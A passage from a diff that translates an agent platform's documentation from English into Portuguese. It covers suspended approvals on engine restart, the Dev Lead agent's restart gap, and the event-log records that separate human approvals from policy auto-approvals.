-memory, so a restart takes it down with it. In that case the task does
-**not** stay waiting: it goes back to the blocked queue, with the reason
-and origin `infra` in the event log, and a decision made after that has
-nowhere left to be applied — the decided action stays recorded, but the
-turn that was waiting for it no longer exists. If you approved and nothing
-happened, this is the first place to look.
+**Com uma exceção: reinício do engine.** O laço suspenso mora em memória,
+então um reinício o derruba junto. Nesse caso a tarefa **não** fica esperando:
+ela volta para a fila de bloqueadas, com o motivo e origem `infra` no event
+log, e uma decisão tomada depois disso não tem mais onde ser aplicada — a ação
+decidida fica registrada, mas o turno que a esperava não existe mais. Se você
+aprovou e nada aconteceu, este é o primeiro lugar a olhar.
 
-Auto-approval doesn't go through here: it executes at the proposal and the
-result comes back in the same turn — which is exactly the value of having
-the patterns from the previous section.
+A auto-aprovação não passa por aqui: ela executa na proposta e o resultado
+volta no mesmo turno — que é exatamente o valor de ter os padrões da seção
+anterior.
 
-**The Dev Lead suspends the same way, with one difference on restart**
-(ADR 0086, [RN-284](../business-rules/engine.md#rn-284)). It's conversational, it
-has no worktree or task — what suspends is the turn's synchronous
-`handle_call`, via `agent.status: awaiting_approval`. Unlike the dev
-agent, it does NOT have a queue to return to on an engine restart: the
-decision remains recorded and visible in Approvals, but the Dev Lead
-doesn't narrate the outcome on its own — the process that was waiting
-died, and the next restart brings up a new Dev Lead, with no subscription
-for that action. An accepted and declared gap, not a disguised one.
+**O Dev Lead suspende do mesmo jeito, com uma diferença no reinício**
+(ADR 0086, [RN-284](../business-rules/engine.md#rn-284)). Ele é conversacional, não
+tem worktree nem tarefa — o que suspende é o `handle_call` síncrono do turno,
+via `agent.status: awaiting_approval`. Diferente do dev agent, ele NÃO tem fila
+para onde voltar num reinício do engine: a decisão continua registrada e
+visível em Aprovações, mas o Dev Lead não narra o desfecho sozinho — o processo
+que esperava morreu, e o próximo reinício sobe um Dev Lead novo, sem inscrição
+para aquela ação. Uma lacuna aceita e declarada, não disfarçada.
 
-## What gets written for each decision
+## O que é gravado em cada decisão
 
-Every proposed action and every decision about it become a **domain
-event** in `session_events`, with the real actor
+Toda ação proposta e toda decisão sobre ela viram um **evento de domínio** em
+`session_events`, com o ator real
 ([RN-049](../business-rules/api.md#rn-049)):
 
-| event | actor | when |
+| evento | ator | quando |
 |---|---|---|
-| `proposed_action.created` | the **agent** that proposed it | always, before any execution. `payload.status` says how the action was born: `pending`, `auto_approved`, or `denied`; `payload.reason` says which rule of `decide()` produced it ([RN-567](../business-rules/api.md#rn-567)) |
-| `proposed_action.approved` | the **user** who clicked | only on manual approval (including `approve_always`) |
-| `permission.granted` | the **user** who clicked "always allow" | only when the click actually recorded a pattern — `payload.patterns` (the patterns recorded, one per segment, [RN-675](../business-rules/api.md#rn-675)) and `payload.pattern` (the same list joined by ", "), or `payload.agentId`/`actionType` for a module dev agent ([RN-642](../business-rules/api.md#rn-642)) |
-| `proposed_action.denied` | the **user** who refused | with `payload.reason` |
-| `action.executed` / `action.failed` | `system` | execution outcome |
+| `proposed_action.created` | o **agente** que a propôs | sempre, antes de qualquer execução. `payload.status` diz como a ação nasceu: `pending`, `auto_approved` ou `denied`; `payload.reason` diz qual regra de `decide()` a produziu ([RN-567](../business-rules/api.md#rn-567)) |
+| `proposed_action.approved` | o **usuário** que clicou | só na aprovação manual (inclusive `approve_always`) |
+| `permission.granted` | o **usuário** que clicou em "sempre permitir" | só quando o clique gravou de fato um padrão — `payload.patterns` (os padrões gravados, um por segmento, [RN-675](../business-rules/api.md#rn-675)) e `payload.pattern` (a mesma lista unida por ", "), ou `payload.agentId`/`actionType` para um dev agent de módulo ([RN-642](../business-rules/api.md#rn-642)) |
+| `proposed_action.denied` | o **usuário** que recusou | com `payload.reason` |
+| `action.executed` / `action.failed` | `system` | desfecho da execução |
 
-From this comes the only reliable way to separate the two things this
-document describes:
+Daí sai o único jeito confiável de separar as duas coisas que este documento
+descreve:
 
-- **human decision** = count `proposed_action.approved` events;
-- **policy decision** = `proposed_action.created` with `status:
-  auto_approved` and an agent actor. It never produces a `.approved`, and
-  so it's never confused with a click. Its `reason` says **which** rule
-  auto-approved — `agent_autonomy: auto_approve`, a `permissions.json allow`
-  line, the container floor, `escopo: cd dentro da pasta do projeto` — in
-  the exact wording `decide()` uses. Events recorded before
-  [RN-567](../business-rules/api.md#rn-567) have no `reason`: read that as "not
-  recorded", not as "no rule". The reason names the rule, not the scope
-  root; since [RN-609](../business-rules/api.md#rn-609) a `terminal` action's
-  event also carries `scopeRoot` — the execution mode plus a RELATIVE
-  identifier of the root the path scope compared against (the
-  `workspace_dir_name` in `container`/`runner`, the segment under
-  `BRABO_PROJECTS_BASE` in `mounted`), never the absolute path, which would
-  expose the user's `$HOME` to every member. The outbox row carries neither
-  `reason` nor `scopeRoot` — no engine consumer reads them. Since
-  [RN-614](../business-rules/web.md#rn-614) the UI shows both, in one sentence
-  built by one function: on the event's line in the session log panel and on
-  the approval card (session chat and the Approvals tab queue). An older
-  event says "not recorded", and the card says so when the event is outside
-  the events loaded on that screen.
+- **decisão humana** = contar eventos `proposed_action.approved`;
+- **decisão de política** = `proposed_action.created` com `status:
+  auto_approved` e ator agente. Ela nunca produz um `.approved`, e por isso
+  nunca se confunde com um clique. O `reason` dela diz **qual** regra
+  auto-aprovou — `agent_autonomy: auto_approve`, uma linha `allow` do
+  `permissions.json`, o piso do container, `escopo: cd dentro da pasta do
+  projeto` — no texto exato que `decide()` usa. Eventos gravados antes da
+  [RN-567](../business-rules/api.md#rn-567) não têm `reason`: leia isso como "não
+  registrado", não como "nenhuma regra". O motivo nomeia a regra, não a raiz
+  do escopo; desde a [RN-609](../business-rules/api.md#rn-609) o evento de uma ação
+  `terminal` leva também `scopeRoot` — o modo de execução mais um
+  identificador RELATIVO da raiz contra a qual o escopo de caminho comparou (o
+  `workspace_dir_name` em `container`/`runner`, o segmento abaixo de
+  `BRABO_PROJECTS_BASE` em `mounted`), nunca o caminho absoluto, que exporia o
+  `$HOME` do usuário a todo membro. A linha do outbox não leva nem `reason` nem
+  `scopeRoot` — nenhum consumidor do engine os lê. Desde a
+  [RN-614](../business-rules/web.md#rn-614) a tela mostra os dois, numa frase
+  montada por uma função só: na linha do evento no painel de log da sessão e no
+  card de aprovação (chat da sessão e fila da aba Aprovações). Um evento mais
+  antigo diz "não registrado", e o card diz isso quando o evento está fora dos
+  eventos carregados naquela tela.
 
-This wasn't true until Phase 12e. The first three rows went **only to the
-outbox**, which is transport — drained, marked with `processed_at`, and
-pruned — and the decision survived only in `proposed_actions.decided_at`,
-a column outside the timeline that the UI, the Psychologist, and the
-Anamnesis read. The practical result was that "how many times did the
-human approve" couldn't be answered in the Phase 10 dogfooding, which was
-exactly that experiment's main metric.
+Isso não era verdade até a Fase 12e. As três primeiras linhas iam **só para o
+outbox**, que é transporte — drenado, marcado com `processed_at` e podado — e
+a decisão sobrevivia só em `proposed_actions.decided_at`, uma coluna fora da
+timeline que a tela, o Psicólogo e a Anamnese leem. O resultado prático foi
+que "quantas vezes o humano aprovou" não pôde ser respondido no dogfooding da
+Fase 10, que era exatamente a métrica principal daquele experimento.
 
-Repository bootstrap is the deliberate exception: the mutations it
-proposes don't emit `proposed_action.created` in the log, because they're
-already narrated by `bootstrap.step_*` in the same session — counting them
-again would inflate the approval metric with work nobody approved.
+O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
+não emitem `proposed_action.created` no log, porque já são narradas por
+`bootstrap.step_*` na mesma sessão — contá-las de novo inflaria a métrica de
+aprovação com trabalho que ninguém aprovou.
